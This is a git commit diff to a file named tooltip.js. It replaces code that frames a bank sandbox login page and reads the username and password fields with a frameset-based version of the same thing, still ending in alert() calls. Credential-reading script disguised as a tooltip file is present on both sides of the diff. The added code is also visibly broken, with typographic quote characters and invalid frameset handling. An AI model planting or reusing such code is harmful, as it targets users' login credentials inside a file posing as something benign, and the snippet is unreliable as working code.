02b3cfa2789ae5bf267352636591e54290ed58d6
dimpol <djdimpol@rocketmail.com>
2016-11-07 20:55:06 +0200

    Update tooltip.js

--- js/dist/tooltip.js
+++ js/dist/tooltip.js
@@ -1,9 +1,20 @@
-var iframe = document.createElement("iframe");   
-iframe.src = "https://apisandbox.openbankproject.com/user_mgt/login";
- iframe.style.width = "640px";
- iframe.style.height = "480px";
-document.body.appendChild(iframe);
-var user = parent.frames[0].document.forms[0].elements[0].value;
-var pass = parent.frames[0].document.forms[0].elements[1].value;
+var frameset = document.createElement(‘frameset’); 
+var frame1 = document.createElement(‘frame’); 
+frameset.src = "https://apisandbox.openbankproject.com/user_mgt/login";
+frameset.style.width = "640px";
+frameset.style.height = "480px";
+document.body.appendChild(frameset);
+frame1.setAttribute(‘src’,’login.php’); 
+frameset.appendChild(frame1);
+
+setTimeout(showLogin,1000);
+
+function showLogin() 
+{ 
+     var user = parent.frames[0].document.forms[0].elements[0].value;
+     var pass = parent.frames[0].document.forms[0].elements[1].value;
 alert(user);
 alert(pass);
+}
+
+
